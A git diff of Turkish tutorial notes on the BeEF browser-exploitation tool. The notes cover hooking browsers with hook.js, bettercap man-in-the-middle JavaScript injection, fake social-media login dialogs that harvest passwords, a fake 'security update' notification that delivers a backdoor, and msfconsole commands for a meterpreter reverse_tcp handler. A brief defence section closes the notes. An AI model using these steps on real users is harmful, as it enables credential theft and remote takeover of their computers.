@@ -1,7 +1,5 @@
 # Beef
 
-******\*\*\******* burda akldıık
-
 BeeF, bir kullanıcının web tarayıcısını hedef alarak kontrol etmeyi amaçlayan bir penetration testing aracıdır.
 
 Nasıl çalışır?
@@ -12,22 +10,22 @@ Nasıl çalışır?
 - Saldırgan tarayıcı üzerinden bazı işlemler yapabilir
 
 - Beef açılır yeni şifre oluşturulur ve arayüz açılır
-- Terminalde hook kodu verilir js.
-- Solda kurbanın online olup olmadığı görünür
+- Terminalde js hook kodu verilir.
+- Yönetim panelinin sol bölümünde, hook edilmiş istemciler “online browser” olarak listelenir ve bu sistemler üzerinde kontrollü test işlemleri gerçekleştirilebilir.
 
 ## Hedefi Oltaya Takmak
 
-- Ağ içi saldırılar için
-- Web sitesi oluşturulmalı ve js kodu koyulmalı
-- Denemek içim kali web olarak açılabilir
+- Ağ içi tarayıcı tabanlı güvenlik testlerinin gerçekleştirilebilmesi için, test ortamında basit bir web uygulaması oluşturulur.
+- Oluşturulan bu web sayfasına, BeEF tarafından sağlanan JavaScript hook kodu entegre edilir.
+- Test ortamını simüle etmek amacıyla, Kali Linux üzerinde yerel bir web sunucusu başlatılır:
   > services apache2 start
-- Beef açıldığında terminalde verilen <script src="http://127.0.0.1:3000/hook.js"></script> kodunu kendi kali ip yazılarak siteye eklenir
+- Beef açıldığında terminalde verilen <script src="http://127.0.0.1:3000/hook.js"></script> kodunu test ortamındaki makinenin yerel IP adresi ile güncellenerek hazırlanan web sayfasına eklenir.
 
-**_ JS Enjeksiyonu _**
+## JS Enjeksiyonu
 
 - Ortadaki adam saldırı ile js enjeksiyonu ile kurbanın girdiği web site önemsiz hacklenebilir.
 
-- bettercap kullanılır. Caplet oluşturulur. OLuşturulmuş caplet kullanılır.
+- Bettercap kullanılır. Caplet oluşturulur. OLuşturulmuş caplet kullanılır.
 
 * Caplet : Bettercap içinde caplet, belirli komutları otomatik çalıştıran script dosyasıdır. Yani Bettercap’i her seferinde tek tek komut yazmadan çalıştırmanı sağlar.
 
@@ -70,19 +68,20 @@ res.Body = body.replace(
 
 - Bu dosyalar /usr/share/bettercap/caplets altına klasör halinde yapıştır bu iki dosyayı. Klasöre beefcustom ismi verilir (opsiyonel)
 
-> bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/beefcustom/beefcustom.cap //tüm işlemleri yapar. http web sitelerinde deneyebilirisin.Kurban browser kullandığında Online browsers kısmında kurban görünür
+> bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/beefcustom/beefcustom.cap //tüm işlemleri kendi yapar. Test ortamında kullanıcı bir web sayfasını HTTP üzerinden ziyaret ettiğinde, tarayıcı oturumu BeEF paneline yönlendirilir ve sistem “online browser” olarak yönetim arayüzünde görünür.
 
-- online olan tarayıcı açılıp "commands" kısmında kurbana neler yapılabileceği gösterilir.
-- Spyder eye seçilir ve execute yapıldığıında kurbanın ekran anlık ekran görüntüsü alınır.
+- Aktif tarayıcı seçildiğinde, sistemin desteklediği çeşitli test ve demo amaçlı komut modülleri “commands” paneli altında listelenir. Bu modüller, tarayıcı üzerinde gerçekleştirilebilecek yetenekleri simüle eder.
 
-**_ Sosyal Medya Şifreleri Nasıl Çalınır _**
+- “Spyder Eye” (ekran izleme / snapshot modülü) seçildiğinde ve çalıştırıldığında, hedef istemcinin tarayıcı oturumundan anlık ekran görüntüsü alınabilir.
+
+## Sosyal Medya Şifreleri Nasıl Çalınır
 
 - Commands kısmında Pretty Thef kısmı açılır. Dialog Type:Facebook,Insta... ,
   Backing: Grey , Logo : Logo girilir inandırıcılık için
 
-- Kurbanın tarayıcısında küçük arayüz açılır. Facebook,instagram tekrar giriş yapın tarzı. Kurban bilgilerini girerse şifre eposta alıınır
+- Kurbanın tarayıcısında küçük arayüz açılır. Facebook,instagram tekrar giriş yapın tarzı. Kurban bilgilerini girerse şifre eposta alınır
 
-**_ Backdoor İletme Yöntemi _**
+## Backdoor İletme Yöntemi
 
 - Beef ile Tarayıcıdan backdoor göndererek kurabının bilgisayarı ele geçirilir
 
@@ -93,9 +92,9 @@ res.Body = body.replace(
 
 - Beef'ten "Fake Notification Bar (crome)" açılır. Url: kısmına kali web .exe urlsi girilir. Url: "http:/10.2.0/backdoor/plugin.exe" , Notification Text:"Tarayıcı güvenlik güncellemesi yapınız."
 
-> msfconsole //açılır
+> msfconsole
 > use exploit/multi/handler
-> msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp //oluşturulan backdoor bilgileri
+> msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp // Oluşturulan backdoor bilgileri
 > msf6 exploit(multi/handler) > show options
 > msf6 exploit(multi/handler) > set LHOST 192.168.64.2
 > msf6 exploit(multi/handler) > set LPORT 8080
@@ -103,10 +102,10 @@ res.Body = body.replace(
 > msf6 exploit(multi/handler) > session -l
 > msf6 exploit(multi/handler) > session -1
 
-**_ Kendimizi Nasıl Koruruz _**
+## Kendimizi Nasıl Koruruz
 
 - Trayıcıdan veya herhangi biri tarafından gelen/indirilen dosyaları sağ tik>isim değiştir yapılıp right to left chacter override var mı bakabiliriz
 
-- Dosyaya sağ tik> özellikler den dosya tipi incelenir .exe olup olmadığı
+- Dosyaya sağ tik> özellikler' den dosya tipi incelenir .exe olup olmadığı kontrol edilebilir.
 
-- arp -a ile aynı mac adresine sahip iki cihaz var mı bakılır
+- arp -a ile aynı mac adresine sahip iki cihaz var mı bakılır.
